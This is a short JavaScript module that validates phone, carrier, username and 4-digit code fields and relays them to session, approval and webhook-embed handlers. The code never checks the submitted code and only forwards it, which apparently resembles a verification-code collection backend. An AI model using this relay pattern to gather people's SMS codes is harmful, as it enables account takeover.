const CARRIERS = new Set(["Bouygues", "Orange", "SFR"]);

function cleanString(value, maxLength) {
  if (typeof value !== "string") return "";
  return value.trim().slice(0, maxLength);
}

export function validatePayload(body) {
  if (!body || typeof body !== "object") {
    throw new Error("Invalid payload");
  }

  const type = body.type;
  if (type !== "request" && type !== "verify") {
    throw new Error("Invalid type");
  }

  const username = cleanString(body.username, 64);
  const phone = cleanString(body.phone, 32);
  const carrier = cleanString(body.carrier, 32);

  if (!username || !phone || !CARRIERS.has(carrier)) {
    throw new Error("Invalid fields");
  }

  const payload = { type, username, phone, carrier };

  if (type === "verify") {
    const code = cleanString(body.code, 4);
    if (!/^\d{4}$/.test(code)) {
      throw new Error("Invalid code");
    }
    payload.code = code;
  }

  return payload;
}

export async function processRequest(payload, { createSession, sendApprovalRequest }) {
  const sessionId = await createSession(payload);
  await sendApprovalRequest({ sessionId, ...payload });
  return { ok: true, sessionId };
}

export async function processVerify(payload, { sendWebhookEmbed }) {
  await sendWebhookEmbed("verify", payload);
  return { ok: true };
}
